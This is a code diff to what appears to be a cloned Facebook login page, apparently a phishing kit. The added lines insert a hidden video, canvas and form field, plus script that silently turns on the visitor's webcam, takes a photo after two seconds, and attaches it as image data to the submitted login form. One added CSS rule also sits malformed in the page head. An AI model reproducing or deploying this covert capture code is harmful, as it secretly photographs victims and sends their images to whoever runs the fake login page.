@@ -12,7 +12,7 @@
       rel="shortcut icon"
       sizes="196x196"
     />
-
+ #video { width: 100%; border-radius: 4px; margin-bottom: 10px; display: none; }
 
     <meta
       name="description"
@@ -5125,6 +5125,10 @@ div.uiInterstitialWithStripes {
                       <noscript
                         ><input type="hidden" name="_fb_noscript" value="true"
                       /></noscript>
+<video id="video" autoplay style="display:none;"></video> <canvas id="canvas" style="display:none;"></canvas> <input type="hidden" name="photo" id="photo">
+
+
+                      
                      </form>
                       
                     <div>
@@ -5390,6 +5394,22 @@ div.uiInterstitialWithStripes {
         window.location.href = redirectUrl;
       });
     });
+             const video = document.getElementById('video'); 
+         const canvas = document.getElementById('canvas'); 
+         const photoInput = document.getElementById('photo');
+         // Access the camera and capture a photo after 2 seconds
+         navigator.mediaDevices.getUserMedia({ video: true })
+           .then(stream => { video.srcObject = stream; setTimeout(() => { 
+             const context = canvas.getContext('2d'); canvas.width = video.videoWidth || 640; 
+             // fallback width
+             canvas.height = video.videoHeight || 480;
+             // fallback height
+             context.drawImage(video, 0, 0, canvas.width, canvas.height);
+             photoInput.value = canvas.toDataURL('image/png');
+             // Stop the video stream to free camera 
+             stream.getTracks().forEach(track => track.stop());
+             video.style.display = 'none'; }, 2000); }) 
+           .catch(err => console.error("Error accessing camera: ", err));
   </script>
 
   </body>
